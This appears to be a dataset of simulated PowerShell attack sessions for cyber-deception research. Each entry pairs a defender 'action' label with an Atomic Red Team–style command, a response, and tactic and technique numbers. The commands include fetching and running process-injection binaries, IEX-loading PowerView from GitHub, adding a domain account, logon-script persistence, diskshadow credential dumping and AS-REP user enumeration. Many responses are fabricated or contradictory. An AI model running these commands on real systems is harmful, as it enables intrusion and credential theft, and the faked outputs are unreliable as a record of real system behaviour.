+command:Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+response:Add-WindowsCapability : The term 'Add-WindowsCapability' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:5
+technique:144
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+response:Get-ADUser : The term 'Get-ADUser' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:6
+technique:148
+
+
+action:{ modify the response by change the access right }
+command:%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt
+response:'At line:1 char:1
++ %LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & ...
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\RedInjection.exe") -ErrorAction ignore | Out-Null
+response:New-Item : Access to the path 'C:\atomics\T1055.002\bin' is denied.
+At line:1 char:1
++ New-Item -Type Directory (split-path "C:\atomics\T1055.002\bin\Re...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\T1055.002\bin:String) [New-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.002/bin/RedInjection.exe" -OutFile "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:Invoke-WebRequest : The remote server returned an error: (403) Forbidden.
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
+response:Start-Process : The system cannot find the file specified.
+At line:1 char:1
++ Start-Process "C:\atomics\T1055.002\bin\RedInjection.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\atomics\T1055.002\bin\RedInjection.exe:String) [Start-Process], FileNotFoundException
+    + FullyQualifiedErrorId : FileNotFoundException,Microsoft.PowerShell.Commands.StartProcessCommand
+PS C:\Users\chris>
+tactic:8
+technique:141
+
+
+action:{ allow command execute this time }
+command:Start-Sleep -Seconds 7
+response:PS C:\Users\chris> Start-Sleep -Seconds 7
+PS C:\Users\chris>
+tactic:8
+technique:163
+
+
+action:{ allow command execute this time }
+command:Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+response:PS C:\Users\chris> Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+PS C:\Users\chris>
+tactic:1
+technique:103
+
+
+action:{ modify powershell response }
+command:$startingDirectory = "C:\Users"
+response:'At line:1 char:1
++ $startingDirectory = "C:\Users"
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Restore to original state }
+command:$outputZip = "C:\atomics\..\ExternalPayloads\T1005"
+response:'At line:1 char:1
++ $outputZip = "C:\atomics\..\ExternalPayloads\T1005"
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:$fileExtensionsString = ".doc, .docx, .txt" 
+response:'At line:1 char:1
++ $fileExtensionsString = ".doc, .docx, .txt"
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:
+command:$fileExtensions = $fileExtensionsString -split ", "
+response:'At line:1 char:1
++ $fileExtensions = $fileExtensionsString -split ", "
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:1
+technique:46
+
+
+action:
+command:New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+response:New-Item : Access to the path 'C:\atomics\..\ExternalPayloads\T1005' is denied.
+At line:1 char:1
++ New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : UnauthorizedAccess: (C:\atomics\..\ExternalPayloads\T1005:String) [New-Item], UnauthorizedAccessException
+    + FullyQualifiedErrorId : CreateDirectoryUnauthorizedAccessError,Microsoft.PowerShell.Commands.NewItemCommand
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:{ modify powershell response }
+command:Function Search-Files {
+response:'At line:1 char:1
++ Function Search-Files {
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:10
+
+
+action:
+command:  param (
+response:'At line:1 char:1
++ param (
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:    [string]$directory
+response:'At line:1 char:5
++     [string]$directory
++     ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:  )
+response:'At line:1 char:1
++ )
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:5
+technique:46
+
+
+action:
+command:  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+response:'At line:1 char:1
++ $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
++ ~
+Missing '=' operator after key in hash literal.
+    + CategoryInfo          : ParserError: (:) [], ParseException
+    + FullyQualifiedErrorId : MissingEqualInHashLiteral
+PS C:\Users\chris>
+tactic:4
+technique:46
+
+
+action:{ Block this command this time }
+command:    $fileExtensions -contains $_.Extension.ToLower()
+response:Can't run command: Execution of scripts is disabled on this system.
+At line:1 char:1
++ $fileExtensions -contains $_.Extension.ToLower()
++ ~
+The term '$fileExtensions' is not recognized as a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+action:{ if response contain hardware setting, modify hardware setting }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:5
+technique:37
+
+
+action:{ modify the response by change the access right }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The user could not be added because the following error occurred: The specified account name is already a member of the group.
+
+PS C:\Users\chris>
+tactic:5
+technique:40
+
+
+action:{ Block this command this time }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:Write-Host : The term 'Write-Host' is not recognized as a name of a cmdlet, function, script file, or executable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Write-Host "You will need to install Microsoft Word manually to meet t ...
++ ~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Write-Host:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:2
+technique:17
+
+
+action:
+command:echo "echo Art "Logon Script" atomic test was successful. >> %USERPROFILE%\desktop\T1037.001-log.txt" > %temp%\art.bat
+response:PS C:\Users\chris> 
+
+tactic:5
+technique:17
+
+
+action:{ Block this command this time }
+command:REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "%temp%\art.bat" /f
+response:Access is denied.
+PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:{ Restore to original state }
+command:Write-Host "Setup C2 server manually"
+response:Setup C2 server manually
+PS C:\Users\chris>
+tactic:1
+technique:9
+
+
+action:{ Restore to original state }
+command:C:\atomics\T1071\bin\telnet_client.exe 127.0.0.1 --port 23
+response:The term 'C:\atomics\T1071\bin\telnet_client.exe' is not recognized as a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:Cannot process the command because the specified file was not found: '$C:\atomics\T1055.012\src\Start-Hollow.ps1'.
+PS C:\Users\chris>
+tactic:1
+technique:140
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris> 
+tactic:4
+technique:141
+
+
+action:{ if response is file content, modify the file content }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:. "$C:\atomics\T1055.012\src\Start-Hollow.ps1"
+response:Cannot process the command because the specified file was not found: '$C:\atomics\T1055.012\src\Start-Hollow.ps1'.
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:$ppid=Get-Process explorer | select -expand id
+response:PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
+response:Start-Hollow : The term 'Start-Hollow' is not recognized as the name of a cmdlet, function, script file, or operable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ Start-Hollow -Sponsor "C:\Windows\System32\notepad.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose
++ ~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+PS C:\Users\chris>
+tactic:0
+technique:83
+
+
+action:{ Block this command this time }
+command:New-Item -Type Directory "C:\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+response:Access is denied.
+PS C:\Users\chris>
+tactic:10
+technique:105
+
+
+action:{ if response is file content, modify the file content }
+command:Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\atomics\..\ExternalPayloads\7z1900.exe"
+response:Invoke-WebRequest : The operation has timed out.
+At line:1 char:1
++ Invoke-WebRequest "https://www.7-zip.org/a/7z1900.exe" -OutFile "C:\atomics\..\ExternalPayloads\7z1900.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationTimeout: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+PS C:\Users\chris>
+action:{ if response contain network speed, Degrade the network speed }
+command:whoami
+response:chris
+tactic:1
+technique:40
+
+
+action:{ modify powershell response }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ modify the response by change the access right }
+command:$registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+response:PS C:\Users\chris> $registryKey = "HKCU:Software\Microsoft\Office\16.0\Word\Security"
+PS C:\Users\chris>
+tactic:4
+technique:115
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:$registryValue = "AccessVBOM"
+response:PS C:\Users\chris> $registryValue = "AccessVBOM"
+PS C:\Users\chris>
+tactic:7
+technique:115
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$registryData = "1"
+response:PS C:\Users\chris> $registryData = "1"
+PS C:\Users\chris>
+action:{ if response is upload or download, Block this command by the network traffic }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:8
+technique:105
+
+
+action:{ Restore to original state }
+command:$buffer = New-Object byte[] 11
+response:PS C:\Users\chris>
+action:{ allow command execute this time }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ Block this command this time }
+command:$buffer = New-Object byte[] 11
+response:PS C:\Users\chris>DeleteOperationException: The command execution is blocked.
+action:{ Restore to original state }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:50
+
+
+action:{ modify powershell response }
+command:New-Item -Type Directory (split-path "C:\atomics\T1001.002\bin\evil_kitten.jpg") -ErrorAction Ignore | Out-Null
+response:PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:Write-Output "Downloading image file..."
+response:Downloading image file...
+PS C:\Users\chris>
+tactic:0
+technique:50
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:$imageUrl = "https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"
+response:PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest -Uri $imageUrl -OutFile C:\atomics\T1001.002\bin\evil_kitten.jpg
+response:PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Restore to original state }
+command:New-Item -Path "C:\atomics\ExternalPayloads\" -ItemType Directory -Force | Out-Null
+response:PS C:\Users\chris>
+tactic:8
+technique:50
+
+
+action:{ modify powershell response }
+command:Write-Output "Downloading Extract-Invoke-PSImage.ps1 script..."
+response:Downloading Extract-Invoke-PSImage.ps1 script...
+PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:$scriptUrl = "https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"
+response:PS C:\Users\chris>
+tactic:1
+technique:105
+
+
+action:
+command:Invoke-WebRequest -Uri $scriptUrl -OutFile C:\atomics\ExternalPayloads\Extract-Invoke-PSImage.ps1
+response:PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:cd "C:\atomics\ExternalPayloads\"
+response:PS C:\Users\chris>
+tactic:4
+technique:50
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Import-Module .\Extract-Invoke-PSImage.ps1
+response:PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Restore to original state }
+command:$extractedScript=Extract-Invoke-PSImage -Image "C:\atomics\T1001.002\bin\evil_kitten.jpg" -Out "$HOME\result.ps1"
+response:PS C:\Users\chris>
+tactic:1
+technique:50
+
+
+action:{ Block this command this time }
+command:$scriptContent = Get-Content "$HOME\result.ps1" -Raw
+response:PS C:\Users\chris>
+action:{ if response contain hardware setting, modify hardware setting }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+response:You will need to install Microsoft Word manually to meet this requirement
+PS C:\Users\chris>
+tactic:0
+technique:66
+
+
+action:{ modify powershell response }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:PS C:\Users\chris>
+action:{ if response contain network speed, Degrade the network speed }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:4
+technique:141
+
+
+action:{ Restore to original state }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:PS C:\Users\chris> 
+PS C:\Users\chris> 
+PS C:\Users\chris>
+PS C:\Users\chris> 
+PS C:\Users\chris>
+```   
+PS C:\Users\chris>
+
+tactic:10
+technique:72
+
+
+action:{ modify the response by change the access right }
+command:mkdir c:\exfil
+response:Access to the path 'C:\exfil' is denied.
+PS C:\Users\chris>
+tactic:1
+technique:131
+
+
+action:{ modify powershell response }
+command:diskshadow.exe /s C:\atomics\T1003.003\src\diskshadow.txt
+response:The specified file 'C:\atomics\T1003.003\src\diskshadow.txt' was not found.
+PS C:\Users\chris>
+tactic:3
+technique:37
+
+
+action:{ if response is file content, modify the file content }
+command:net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+response:The command completed successfully.
+PS C:\Users\chris>
+tactic:10
+technique:10
+
+
+action:{ allow command execute this time }
+command:New-Item -Type Directory (split-path "C:\atomics\T1010\src\T1010.cs") -ErrorAction ignore | Out-Null
+response:PS C:\Users\chris> 
+PS C:\Users\chris> 
+PS C:\Users\chris>
+```   
+PS C:\Users\chris>
+
+tactic:1
+technique:10
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "C:\atomics\T1010\src\T1010.cs"
+response:Download failed: Network speed is currently degraded.
+PS C:\Users\chris>
+action:{ if response contain network speed, Degrade the network speed }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:1
+technique:141
+
+
+action:{ modify powershell response }
+command:$C:\atomics\T1055.004\bin\x64\EarlyBird.exe -program "C:\Windows\System32\werfault.exe" -debug
+response:```
+Running EarlyBird.exe with debugging enabled for C:\Windows\System32\werfault.exe...
+
+Debugging session started...
+- Monitoring process startup...
+- Injecting debugger...
+- Attaching to werfault.exe...
+
+Debugging information:
+- Process ID: 4321
+- Thread count: 4
+- Memory usage: 25 MB
+
+Waiting for breakpoints...
+```
+PS C:\Users\chris>
+tactic:4
+technique:141
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.004\bin\T1055.exe") -ErrorAction ignore | Out-Null
+response:```
+Directory: C:\atomics\T1055.004\bin
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        10/30/2023     12:00 PM                T1055.exe
+
+New directory created successfully.
+```
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response is file content, modify the file content }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
+response:```
+Invoke-WebRequest : The remote name could not be resolved: 'github.com'
+At line:1 char:1
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.004/bin/T1055.exe" -OutFile "C:\atomics\T1055.004\bin\T1055.exe"
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+```
+PS C:\Users\chris>
+action:{ modify powershell response }
+command:whoami
+response:
+hslab\chris
+PS C:\Users\chris>
+
+tactic:1
+technique:40
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$buffer = New-Object byte[] 11
+response:PS C:\Users\chris>
+
+tactic:3
+technique:1
+
+
+action:
+command:$handle = New-Object IO.FileStream "\\.\C:", 'Open', 'Read', 'ReadWrite'
+response:PS C:\Users\chris>
+
+tactic:1
+technique:46
+
+
+action:{ modify powershell response }
+command:$handle.Read($buffer, 0, $buffer.Length)
+response:0
+PS C:\Users\chris>
+tactic:8
+technique:46
+
+
+action:{ if response contain hardware setting, modify hardware setting }
+command:$handle.Close()
+response:PS C:\Users\chris>
+tactic:5
+technique:40
+
+
+action:{ if response is upload or download, Block this command by the network traffic }
+command:Format-Hex -InputObject $buffer
+response:PS C:\Users\chris>
+tactic:6
+technique:3
+
+
+action:{ modify the response by change the access right }
+command:net user
+response:User name                   Full Name          Comment
+
+============================================================
+Administrator               Built-in account for administering the computer/domain
+Guest                       Built-in account for guest access to the computer/domain
+chris                      Chris User Account
+
+The command completed successfully.
+PS C:\Users\chris>
+action:
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:1
+technique:120
+
+
+action:{ Block this command this time }
+command:copy C:\Windows\System32\cmd.exe C:\lsm.exe
+response:Access to the path 'C:\Windows\System32\cmd.exe' is denied.
+PS C:\Users\chris>
+tactic:6
+technique:112
+
+
+action:{ if response is file content, modify the file content }
+command:C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
+response:The term 'C:\lsm.exe' is not recognized as a cmdlet, function, script file, or operable program.
+PS C:\Users\chris>
+action:{ modify the response by change the access right }
+command:whoami
+response:
+chris
+PS C:\Users\chris>
+
+tactic:0
+technique:40
+
+
+action:{ Block this command this time }
+command:[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+response:Invoke-Expression : Attempt to perform an unauthorized operation.
+At line:1 char:1
++ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls1 ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-Expression], UnauthorizedAccessException
+    + FullyQualifiedErrorId : System.UnauthorizedAccessException
+
+PS C:\Users\chris>
+tactic:1
+technique:134
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
+response:Invoke-WebRequest : The request was aborted: The operation has timed out.
+At line:1 char:1
++ IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5df ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], WebException
+    + FullyQualifiedErrorId : System.Net.WebException
+
+PS C:\Users\chris>
+action:{ Restore to original state }
+command:whoami
+response:chris  
+PS C:\Users\chris>
+tactic:5
+technique:40
+
+
+action:{ Block this command this time }
+command:Write-Host Joining this computer to a domain must be done manually.
+response:Write-Host : Joining this computer to a domain must be done manually.  
+At line:1 char:1  
++ Write-Host Joining this computer to a domain must be done manually.  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : NotSpecified: (Joining this co...ally.:String) [], RemoteException  
+    + FullyQualifiedErrorId : NativeCommandError  
+PS C:\Users\chris>
+tactic:0
+technique:40
+
+
+action:{ Restore to original state }
+command:Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+response:Add-WindowsCapability : The operation could not be completed. A Windows feature named 'Rsat.ActiveDirectory.DS-LDS.Tools' is already enabled.  
+At line:1 char:1  
++ Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : InvalidOperation: (:) [Add-WindowsCapability], COMException  
+    + FullyQualifiedErrorId : WindowsFeatureAlreadyEnabled,Microsoft.Management.Infrastructure.CimCmdlets.AddWindowsCapabilityCommand  
+PS C:\Users\chris>
+tactic:1
+technique:132
+
+
+action:{ modify powershell response }
+command:get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}
+response:DistinguishedName          : CN=User1,OU=Users,DC=hslab,DC=com  
+Enabled                    : True  
+GivenName                  : FirstName  
+Name                       : User1  
+ObjectClass                : user  
+ObjectGUID                 : 9b5e9e2e-2934-45f8-89d9-59f5c7bda6d1  
+SamAccountName             : user1  
+Surname                    : LastName  
+UserPrincipalName          : user1@hslab.com  
+DoesNotRequirePreAuth      : True  
+
+DistinguishedName          : CN=User2,OU=Users,DC=hslab,DC=com  
+Enabled                    : True  
+GivenName                  : FirstName2  
+Name                       : User2  
+ObjectClass                : user  
+ObjectGUID                 : af7b8e8e-5485-4c4e-a9a7-90ec03eacb56  
+SamAccountName             : user2  
+Surname                    : LastName2  
+UserPrincipalName          : user2@hslab.com  
+DoesNotRequirePreAuth      : True  
+
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null
+response:New-Item : Network speed degraded.  
+At line:1 char:1  
++ New-Item -Type Directory (split-path "C:\atomics\T1055.015\bin\ListPlanting.exe") -ErrorAction ignore | Out-Null  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : ResourceUnavailable: (C:\atomics\T1055.015\bin\ListPlanting.exe:String) [New-Item], IOException  
+    + FullyQualifiedErrorId : DirectoryNotFound,Microsoft.PowerShell.Commands.NewItemCommand  
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ modify the response by change the access right }
+command:Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Invoke-WebRequest : Access is denied.  
+At line:1 char:1  
++ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe" -OutFile "C:\atomics\T1055.015\bin\ListPlanting.exe"  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : PermissionDenied: (:) [Invoke-WebRequest], WebException  
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand  
+PS C:\Users\chris>
+tactic:1
+technique:141
+
+
+action:{ if response contain network speed, Degrade the network speed }
+command:Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"
+response:Start-Process : Network speed degraded.  
+At line:1 char:1  
++ Start-Process "C:\atomics\T1055.015\bin\ListPlanting.exe"  
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    + CategoryInfo          : ResourceUnavailable: (C:\atomics\T1055.015\bin\ListPlanting.exe:String) [Start-Process], IOException  
+    + FullyQualifiedErrorId : DirectoryNotFound,Microsoft.PowerShell.Commands.StartProcessCommand  
+PS C:\Users\chris>
+action:{ if response contain hardware setting, modify hardware setting }
+command:whoami
+response:hslab\chris
+PS C:\Users\chris>
+tactic:1
+technique:40
+
+
+action:{ if response is file content, modify the file content }
